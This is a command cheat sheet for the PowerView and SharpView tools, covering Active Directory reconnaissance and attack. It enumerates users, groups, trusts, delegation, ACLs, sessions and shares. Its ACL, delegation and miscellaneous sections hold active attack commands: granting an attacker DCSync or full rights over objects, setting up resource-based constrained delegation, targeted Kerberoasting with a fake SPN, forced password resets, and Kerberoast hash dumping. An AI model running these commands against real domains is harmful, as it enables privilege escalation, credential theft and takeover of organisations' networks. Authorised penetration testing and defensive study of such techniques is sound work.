PowerView.ps1 and SharpView are both used in domain reconnaissance. SharpView is just the .NET variant. 
### Domain / Forest

```powershell
Get-Domain                                 # current domain object
Get-Domain -Domain <D>                      # remote domain
Get-DomainController                        # DCs in domain
Get-DomainController -Domain <D>
Get-Forest
Get-ForestDomain                            # all domains in forest
Get-DomainTrust                             # trust relationships
Get-ForestTrust
Get-DomainPolicy                            # password/lockout policy
```

### Users

```powershell
Get-DomainUser                              # all users
Get-DomainUser -Identity <U> -Properties *  # one user, all attrs
Get-DomainUser -SPN                         # kerberoastable (has SPN)
Get-DomainUser -PreauthNotRequired          # AS-REP roastable
Get-DomainUser -TrustedToAuth               # constrained delegation
Get-DomainUser -AdminCount                  # protected/admin users
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties samaccountname,description
```

### Groups

```powershell
Get-DomainGroup                             # all groups
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroup -UserName <U>               # groups a user belongs to
Get-DomainManagedSecurityGroup
```

### Computers

```powershell
Get-DomainComputer -Properties dnshostname,operatingsystem
Get-DomainComputer -Unconstrained           # unconstrained delegation
Get-DomainComputer -TrustedToAuth           # constrained delegation
Get-DomainComputer -SPN mssql*              # find by SPN
Get-DomainComputer -Ping                    # only live hosts
```

### GPO / OU

```powershell
Get-DomainGPO
Get-DomainGPO -ComputerIdentity <H>         # GPOs applied to host
Get-DomainOU
Get-DomainGPOLocalGroup                     # GPOs granting local admin
Get-DomainGPOUserLocalGroupMapping -Identity <U>   # where user is local admin via GPO
Get-DomainGPOComputerLocalGroupMapping -ComputerName <H>
```

### ACLs (key for attack paths)

```powershell
Get-DomainObjectAcl -Identity <U> -ResolveGUIDs
Get-DomainObjectAcl -SearchBase "LDAP://..." -ResolveGUIDs
# Find interesting ACLs (writable by current user / low-priv principals)
Find-InterestingDomainAcl -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<U>"}
Add-DomainObjectAcl -TargetIdentity <U> -PrincipalIdentity <attacker> -Rights All
Add-DomainObjectAcl -TargetIdentity "DC=...,DC=..." -PrincipalIdentity <U> -Rights DCSync
```

### Sessions / Local Admin Hunting

```powershell
Find-DomainUserLocation                     # hunt where users are logged in
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
Find-LocalAdminAccess                       # hosts where current user is local admin
Get-NetSession -ComputerName <H>
Get-NetLoggedon -ComputerName <H>
Test-AdminAccess -ComputerName <H>
Find-DomainProcess -ComputerName <H>        # processes on remote host
```

### Shares / Files

```powershell
Find-DomainShare                            # all shares in domain
Find-DomainShare -CheckShareAccess          # only readable shares
Find-InterestingDomainShareFile -Include *.txt,*.xml,*.ps1,*.config
Get-NetShare -ComputerName <H>
```

### Delegation / Kerberos abuse setup

```powershell
Get-DomainComputer -Unconstrained -Properties dnshostname
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
# RBCD setup (writable msDS-AllowedToActOnBehalfOfOtherIdentity)
Set-DomainObject -Identity <target-computer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=<SDDL>}
```

### Misc / Pivot helpers

```powershell
Get-DomainSID
Get-DomainObject -Identity <U>
Set-DomainObject -Identity <U> -Set @{'servicePrincipalName'='nonexistent/svc'}   # targeted kerberoast
Set-DomainUserPassword -Identity <U> -AccountPassword (ConvertTo-SecureString '<P>' -AsPlainText -Force)
Get-DomainSPNTicket -SPN <spn>
Invoke-Kerberoast -OutputFormat Hashcat | fl
```

### SharpView syntax notes

SharpView mirrors PowerView method names but uses `-ArgName Value` flags and no pipeline:

```powershell
SharpView.exe Get-DomainUser -Identity <U> -Properties samaccountname,memberof
SharpView.exe Find-InterestingDomainAcl -ResolveGUIDs
SharpView.exe Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Some common usages
Get-DomainUser / Get-DomainComputer / Get-DomainGroup:

-Identity <name> — target a specific object
-Properties <prop1>,<prop2> — limit returned attributes (comma-separated, no spaces)
-LDAPFilter <filter> — raw LDAP filter string
-SearchBase <DN> — scope the search to an OU/container
-Domain <domain> — target domain
-Server <DC> — specific DC to query
-Recurse — for group membership, resolve nested groups
-Credential — alternate creds (awkward in SharpView; usually run as the target user instead)
```

> NOTE: SharpView can't pipe, so filtering you'd normally do with `?{} / Where-Object` has to be done after the fact or with built-in args.